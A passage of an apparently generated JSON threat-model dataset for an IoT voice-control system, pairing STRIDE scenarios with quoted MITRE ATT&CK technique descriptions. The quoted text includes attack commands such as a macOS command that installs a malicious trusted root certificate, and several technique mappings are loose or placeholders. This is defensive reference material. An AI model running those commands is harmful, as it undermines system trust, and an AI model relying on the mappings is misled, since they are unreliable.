                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server-side application with fake requests, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The server can be reached from the public internet.",
                    "Role": "Attacker",
                    "Condition": "Publicly accessible server."
                },
                {
                    "Assumption": "The server lacks effective rate limiting or DDoS protection mechanisms.",
                    "Role": "System Developer",
                    "Condition": "Inadequate DDoS mitigation solutions."
                },
                {
                    "Assumption": "The server has resource limitations that can be exhausted.",
                    "Role": "System Administrator",
                    "Condition": "Server resource constraints."
                }
            ],
            "Potential Impact": "Disruption of legitimate services and unavailability for users.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Service Disruption",
                "Resource Exhaustion",
                "Server Flood"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An adversary exploits a known vulnerability to crash IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices have unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delay or neglect in applying security patches."
                },
                {
                    "Assumption": "The attacker has the ability to communicate with the devices.",
                    "Role": "Attacker",
                    "Condition": "Network access to IoT endpoints."
                },
                {
                    "Assumption": "The exploit does not require legitimate authentication.",
                    "Role": "Attacker",
                    "Condition": "Publicly accessible exploit."
                }
            ],
            "Potential Impact": "Disruption in the functionality of IoT devices, causing loss of control and operational downtime.",
            "MITRE ATT&CK Keywords": [
                "Exploitation of Vulnerability",
                "Crash Device",
                "Service Disruption",
                "IoT Device Compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0200f7ae-960d-4add-a1f1-379b11a99c51",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious insider intentionally disables or disrupts IoT devices' operations.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access to device controls.",
                    "Role": "Insider",
                    "Condition": "Privileged or authorized access."
                },
                {
                    "Assumption": "There is a lack of monitoring and logging for device interactions.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient activity monitoring."
                },
                {
                    "Assumption": "Insider actions are not flagged or controlled.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access controls."
                }
            ],
            "Potential Impact": "Operational disruptions leading to partial or complete loss of IoT device functionality.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Service Disruption",
                "Device Disablement",
                "Operational Impact"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain administrative access to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller software has exploitable vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or outdated software."
                },
                {
                    "Assumption": "The attacker has the ability to communicate with the controller.",
                    "Role": "Attacker",
                    "Condition": "Network access to the controller."
                },
                {
                    "Assumption": "The vulnerability does not require prior authentication.",
                    "Role": "Attacker",
                    "Condition": "Publicly accessible exploit."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices and potential exploitation of connected systems.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Exploitation of Vulnerability",
                "IoT Controller Compromise",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user escalates privileges by exploiting weak access controls on the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application does not properly enforce role-based access controls.",
                    "Role": "System Developer",
                    "Condition": "Poorly implemented access control mechanisms."
                },
                {
                    "Assumption": "The user has a valid, lower-privileged account.",
                    "Role": "User/Attacker",
                    "Condition": "Legitimate user access."
                },
                {
                    "Assumption": "The exploit can bypass existing access restrictions.",
                    "Role": "Attacker",
                    "Condition": "Presence of access control bypass vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to critical functions and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Access Control Bypass",
                "Privilege Escalation",
                "Role Exploitation",
                "Server Compromise"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker with physical access connects a malicious device to the network to compromise IoT functions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access the network interface.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical security."
                },
                {
                    "Assumption": "Network devices do not sufficiently authenticate new devices.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate network access controls."
                },
                {
                    "Assumption": "IoT functions do not independently verify command sources.",
                    "Role": "System Developer",
                    "Condition": "Absence of source verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices and potential network compromise.",
            "MITRE ATT&CK Keywords": [
                "Physical Access Exploitation",
                "Network Compromise",
                "IoT Device Compromise",
                "Unauthorized Control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises as a legitimate user by recording and replaying voice commands to gain illicit access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can record the legitimate user's voice commands.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the user's microphone or the environment where commands are spoken."
                },
                {
                    "Assumption": "The system does not have robust mechanisms to detect replay attacks.",
                    "Role": "System",
                    "Condition": "The system lacks anti-replay defenses or proper voice authentication."
                },
                {
                    "Assumption": "Voice commands are sufficient to access sensitive functionalities.",
                    "Role": "System",
                    "Condition": "The system allows high-level control based solely on voice commands."
                }
            ],
            "Potential Impact": "Unauthorized access to system features and potential abuse of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "replay attack",
                "voice command",
                "authentication bypass",
                "IoT device"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends forged responses from the server-side application to the client-side application to manipulate the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and modify network traffic between the client and server.",
                    "Role": "Attacker",
                    "Condition": "Unencrypted communication channels or weak network security."
                },
                {
                    "Assumption": "The IoT controller acts on the instructions without verifying authenticity.",
                    "Role": "System",
                    "Condition": "The IoT controller lacks proper authentication mechanisms."
                },
                {
                    "Assumption": "The attacker knows the communication protocol to craft believable responses.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of protocol specifics or access to documentation."
                }
            ],
            "Potential Impact": "Manipulation of IoT devices leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network traffic interception",
                "forged responses",
                "IoT control",
                "command injection"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a rogue IoT device that pretends to be a legitimate device in the network to capture or alter data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can introduce a rogue device into the network.",
                    "Role": "Attacker",
                    "Condition": "Physical or network access to introduce the device."
                },
                {
                    "Assumption": "The system does not have stringent device authentication mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of device-level authentication and verification."
                },
                {
                    "Assumption": "The legitimate devices do not verify the identity of other communicating devices.",
                    "Role": "System",
                    "Condition": "Trust-based communication without verification."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data manipulation or theft.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "rogue device",
                "network injection",
                "IoT communication",
                "data capture"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of IoT devices to alter their behavior and perform malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update mechanisms are not adequately secured.",
                    "Role": "System",
                    "Condition": "Lack of secure update channels or verification."
                },
                {
                    "Assumption": "The attacker has access to the devices physically or through the network.",
                    "Role": "Attacker",
                    "Condition": "Physical or network access to the devices is possible."
                },
                {
                    "Assumption": "The attacker can bypass existing security controls to inject malicious firmware.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to bypass or exploit vulnerabilities."
                }
            ],
            "Potential Impact": "Undermined integrity and functionality of IoT devices, causing them to perform unintended actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "IoT",
                "malicious update",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters transmitted voice commands or responses in transit between the client and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not properly encrypted.",
                    "Role": "System",
                    "Condition": "Lack of encryption for data in transit."
                },
                {
                    "Assumption": "The attacker can intercept and manipulate network traffic.",
                    "Role": "Attacker",
                    "Condition": "Control or access to pertinent network infrastructure."
                },
                {
                    "Assumption": "Voice data is sent in an alterable format.",
                    "Role": "System",
                    "Condition": "Transmission of voice commands in formats vulnerable to manipulation."
                }
            ],
            "Potential Impact": "Unintended actions are performed by the system, potentially compromising functionality and security.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "intercepted communication",
                "data modification",
                "voice command",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates stored data in cloud services to alter system behavior or compromise data integrity.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage security is inadequate or has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Weak or insufficient cloud security measures."
                },
                {
                    "Assumption": "The attacker has gained unauthorized access to the cloud services.",
                    "Role": "Attacker",
                    "Condition": "Successful breach of cloud account or infrastructure."
                },
                {
                    "Assumption": "Sensitive data stored in the cloud is used by the system for operations.",
                    "Role": "System",
                    "Condition": "Dependence on cloud-stored data for critical functionality."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to erroneous or malicious system behavior.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud storage",
                "data manipulation",
                "malicious access",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a voice command that triggered an unauthorized action on an IoT device.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log and verify all voice command activities.",
                    "Role": "System",
                    "Condition": "Insufficient logging and verification mechanisms."
                },
                {
                    "Assumption": "The user's identity is weakly associated with the voice commands.",
                    "Role": "System",
                    "Condition": "Weak or absent identity binding for commands."
                },
                {
                    "Assumption": "Evidence of command issuance is not non-repudiable.",
                    "Role": "System",
                    "Condition": "Lack of non-repudiation mechanisms in command processing."
                }
            ],
            "Potential Impact": "Inability to hold users accountable for actions triggered by voice commands.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice command",
                "accountability",
                "logging",
                "verification"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies their malicious actions after tampering with network traffic between voice commands and responses.",
            "Assumptions": [
                {
                    "Assumption": "The system does not monitor and log network traffic effectively.",
                    "Role": "System",
                    "Condition": "Insufficient network monitoring and logging."
                },
                {
                    "Assumption": "Network tampering activities can be carried out undetected.",
                    "Role": "Attacker",
                    "Condition": "No real-time detection and response mechanisms."
                },
                {
                    "Assumption": "Evidence of tampering is not retained or is easily alterable.",
                    "Role": "System",
                    "Condition": "Lack of tamper-evident logging and evidence preservation."
                }
            ],
            "Potential Impact": "Evasion of detection and accountability for network-based tampering activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network tampering",
                "denial",
                "logging",
                "undetected tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes ownership of an IoT command after an incident involving unauthorized IoT device actions.",
            "Assumptions": [
                {
                    "Assumption": "Command logs do not uniquely identify the user or command origin.",
                    "Role": "System",
                    "Condition": "Weak or absent user identification for commands."
                },
                {
